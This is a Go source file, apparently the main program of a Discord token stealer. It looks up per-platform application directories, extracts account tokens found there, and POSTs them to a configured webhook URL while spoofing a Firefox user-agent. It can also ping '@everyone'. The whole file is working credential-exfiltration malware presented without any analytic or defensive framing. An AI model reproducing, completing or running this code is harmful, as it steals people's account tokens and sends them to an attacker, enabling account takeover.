package main.go

import (
	"bytes"
	"fmt"
	"net/http"
	"os"
	"strings"

	"Github/constants"
	"Github/findTokens"
	"Github/getDirs"
)

func main() {
	paths := getDirs.GetDirs()

	var message string
	if constants.PING_ME {
		message = "@everyone\n"
	}
	for platform, path := range paths {
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}
		message += fmt.Sprintf("**%s**\n```\n", platform)
		tokens := strings.Join(findTokens.FindTokens(path), "\n")
		if len(tokens) > 0 {
			message += tokens
		} else {
			message += "No tokens were found"
		}
		message += "\n```\n"
	}
	data := []byte(`{"content":"` + message + `"}`)
	req, _ := http.NewRequest("POST", constants.WEBHOOK_URL, bytes.NewBuffer(data))
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0")
	req.Header.Set("content-type", "application/json")
	cl := &http.Client{}
	resp, err := cl.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
}
